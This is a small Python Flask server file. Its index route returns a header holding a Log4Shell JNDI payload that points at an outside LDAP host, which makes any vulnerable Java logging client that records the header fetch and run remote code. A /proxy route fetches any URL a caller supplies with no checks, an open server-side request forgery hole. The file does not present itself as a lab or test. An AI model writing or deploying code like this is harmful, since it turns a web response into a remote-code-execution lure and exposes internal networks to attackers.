from flask import Flask, make_response, request
import requests

app = Flask(__name__)

@app.route('/')
def index():
    response = make_response('Hello, World!')
    response.headers['Content-Type'] = 'text/plain'
    response.headers['X-Example-Header'] = '${jndi:ldap://ldap.drewpy.pro:16969/a}'
    return response

@app.route('/proxy')
def proxy_request():
    url = request.args.get('url')
    if url:
        try:
            response = requests.get(url)
            return response.text, response.status_code
        except requests.RequestException as e:
            return str(e), 500
    return "No URL provided", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9090)
